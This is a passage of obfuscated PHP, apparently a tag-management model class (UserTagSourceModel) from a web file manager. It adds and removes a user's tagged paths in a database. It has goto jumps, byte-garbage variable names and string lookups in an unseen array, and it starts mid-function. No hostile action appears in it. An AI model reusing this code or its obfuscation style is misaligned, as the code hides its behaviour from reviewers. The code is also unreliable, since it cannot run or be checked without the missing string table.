dØ†»öÒ‰š; dØ†»öÒ‰š: $Cò¼²áãç =& $_SERVER[í¤âËÚ£¶íÊ¢]; $a¶¢¯ÏÌ« = array($Cò¼²áãç[1479] => USER_ID, $Cò¼²áãç[466] => 0); $eé¸•Û¡ = $this->field($Cò¼²áãç[28])->where($a¶¢¯ÏÌ«)->select(); goto C”áô…ä›; C”áô…ä›: $eé¸•Û¡ = array_to_keyvalue($eé¸•Û¡, $Cò¼²áãç[33], $Cò¼²áãç[28]); if (!$eé¸•Û¡ || !in_array($E‚ÆŞ †¹¦, $eé¸•Û¡)) { return $E‚ÆŞ †¹¦; } for ($F–êîÒïÜ¶ = 0; $F–êîÒïÜ¶ < count($eé¸•Û¡); $F–êîÒïÜ¶++) { if (!in_array($E‚ÆŞ †¹¦ . "\50{$F–êîÒïÜ¶}\x29", $eé¸•Û¡)) { return $E‚ÆŞ †¹¦ . "\x28{$F–êîÒïÜ¶}\51"; } } goto AğáÁóóâ›; AğáÁóóâ›: return $E‚ÆŞ †¹¦ . "\50{$F–êîÒïÜ¶}\51"; goto dİ•ñÖÇŞ; dİ•ñÖÇŞ: } } goto fÂÏ×¨Œ‡›; aÎÑô¶íÆ: class UserTagSourceModel extends ModelBase { protected $tableName = "\x75\163\x65\x72\137\146\x61\166"; protected function cacheFunctionAlias($D©ñ©Í¿¹‘) { $dğŠˆäªô  =& $_SERVER[í¤âËÚ£¶íÊ¢]; return array($dğŠˆäªô [1753] => array(USER_ID, $dğŠˆäªô [1754])); } protected function listData() { $e½œõ®ùù =& $_SERVER[í¤âËÚ£¶íÊ¢]; $Cê±êäëÒ = array($e½œõ®ùù[1479] => USER_ID, $e½œõ®ùù[466] => array($e½œõ®ùù[1757], 0)); $b àÚŠ…Ò = $e½œõ®ùù[1759]; $CÇè……Âœè = $this->field($b àÚŠ…Ò)->where($Cê±êäëÒ)->order($e½œõ®ùù[1760])->select(); return $CÇè……Âœè ? $CÇè……Âœè : array(); } protected function listByTag($bÛÓ©ò¼è³) { } protected function addToTag($dµÇÂŒöÊ, $Aœï·¸À­£) { $BÍÔê°Ã»¢ =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (!Model($BÍÔê°Ã»¢[1895])->listData($Aœï·¸À­£) || !Model($BÍÔê°Ã»¢[759])->pathInfo($dµÇÂŒöÊ)) { return !1; } $eĞİõ‚ÖÖ = array($BÍÔê°Ã»¢[1479] => USER_ID, $BÍÔê°Ã»¢[466] => $Aœï·¸À­£, $BÍÔê°Ã»¢[417] => $dµÇÂŒöÊ, $BÍÔê°Ã»¢[418] => $BÍÔê°Ã»¢[412], $BÍÔê°Ã»¢[416] => $BÍÔê°Ã»¢[33], $BÍÔê°Ã»¢[1654] => 0); if ($this->where($eĞİõ‚ÖÖ)->find()) { return !1; } return $this->add($eĞİõ‚ÖÖ); } protected function removeFromTag($cŠ±Çœò, $A±÷¢µ¼®Ğ) { $dˆÆö·‚§Š =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (!Model($dˆÆö·‚§Š[1895])->listData($A±÷¢µ¼®Ğ)) { return !1; } if (is_array($cŠ±Çœò)) { $cŠ±Çœò = array($dˆÆö·‚§Š[7], $cŠ±Çœò); } $B·£¹ÌÉåÌ = array($dˆÆö·‚§Š[1479] => USER_ID, $dˆÆö·‚§Š[466] => $A±÷¢µ¼®Ğ, $dˆÆö·‚§Š[418] => $dˆÆö·‚§Š[412], $dˆÆö·‚§Š[417] => $cŠ±Çœò); return $this->where($B·£¹ÌÉåÌ)->delete(); } protected function removeByTag($Aˆ´­Ş°š‡) { $F“½Ë†ÙØ =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (!$Aˆ´­Ş°š‡) { return !1; } $b°áÉÒä = array($F“½Ë†ÙØ[1479] => USER_ID, $F“½Ë†ÙØ[466] => $Aˆ´­Ş°š‡); return $this->where($b°áÉÒä)->delete(); } protected function removeBySource($CˆêÍ²˜Â) { $FÎ—É¶– =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (is_array($CˆêÍ²˜Â)) { $CˆêÍ²˜Â = array($FÎ—É¶–[7], $CˆêÍ²˜Â); } $aÔ‡×ä÷Ä  = array($FÎ—É¶–[1479] => USER_ID, $FÎ—É¶–[417] => $CˆêÍ²˜Â, $FÎ—É¶–[466] => array($FÎ—É¶–[932], 0)); return $this->where($aÔ‡×ä÷Ä )->delete(); } }